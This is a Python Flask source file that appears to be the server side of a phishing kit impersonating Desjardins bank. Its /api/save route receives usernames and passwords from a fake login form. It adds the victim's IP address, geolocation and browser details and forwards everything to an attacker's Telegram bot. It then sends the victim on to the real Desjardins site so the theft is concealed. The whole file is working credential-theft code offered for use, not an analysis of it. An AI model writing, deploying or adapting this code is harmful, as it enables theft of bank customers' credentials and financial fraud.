from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import os
import time
import json
import urllib.request
import urllib.parse

app = Flask(__name__)
CORS(app)

# ---------- Rate Limiter ----------
def get_username_or_ip():
    data = request.get_json(silent=True) or {}
    username = data.get("username", "").strip()
    if username:
        return f"{get_remote_address()}:{username}"
    return get_remote_address()

limiter = Limiter(
    get_username_or_ip,
    app=app,
    default_limits=["100 per hour"],
    storage_uri="memory://"
)

# ---------- Config ----------
REDIRECT_URL       = "https://www.desjardins.com/"
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "")


# ---------- Geo Lookup ----------
def get_geo_info(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode())
            if data.get("status") == "success":
                return (
                    data.get("country", "Unknown"),
                    data.get("regionName", "Unknown"),
                    data.get("city", "Unknown"),
                    data.get("isp", "Unknown"),
                )
    except Exception as e:
        print(f"⚠️ Geo lookup failed: {e}")
    return ("Unknown", "Unknown", "Unknown", "Unknown")


# ---------- Telegram ----------
def send_to_telegram(username, password, ip, user_agent):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("⚠️ Telegram not configured")
        return

    country, region, city, isp = get_geo_info(ip)
    date = time.strftime("%Y-%m-%d")

    # Domain
    domain = request.headers.get("Origin") or request.headers.get("Referer") or "N/A"
    domain = domain.replace("https://", "").replace("http://", "").split("/")[0]

    message = (
        "====================\n"
        "DESJARDINS\n"
        "++++++++++++++++++++\n"
        f"{date}\n"
        f"domain: {domain}\n"
        f"{country}|{region}|{city}|eng|{isp}|\n"
        f"ip: {ip}\n"
        f"ua: {user_agent}\n"
        "\n"
        f"Username : {username or ''}\n"
        f"Password : {password or ''}\n"
        "\n"
        "\n"
        "\n"
        "++++++++++++++++++++\n"
        "===================="
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }).encode("utf-8")

    try:
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req, timeout=10) as response:
            response.read()
        print(f"📨 Telegram sent: {username}")
    except Exception as e:
        print(f"❌ Telegram error: {e}")


# ---------- Routes ----------
@app.route("/", methods=["GET"])
def home():
    return jsonify({"status": "ok", "message": "Backend is running"})


@app.route("/api/save", methods=["POST"])
@limiter.limit("20 per minute")
@limiter.limit("200 per hour")
def save():
    data = request.get_json(silent=True)

    if not data:
        return jsonify({"success": False, "message": "No data provided"}), 400

    username = data.get("username", "").strip()
    password = data.get("password", "").strip()

    if not username or not password:
        return jsonify({"success": False, "message": "All fields required"}), 400

    ip = get_remote_address()
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        ip = forwarded.split(",")[0].strip()

    user_agent = request.headers.get("User-Agent", "Unknown")

    send_to_telegram(username, password, ip, user_agent)
    print(f"💾 Received: {username} | {ip}")

    return jsonify({
        "success": True,
        "message": "Saved successfully ✅",
        "redirect_url": REDIRECT_URL
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
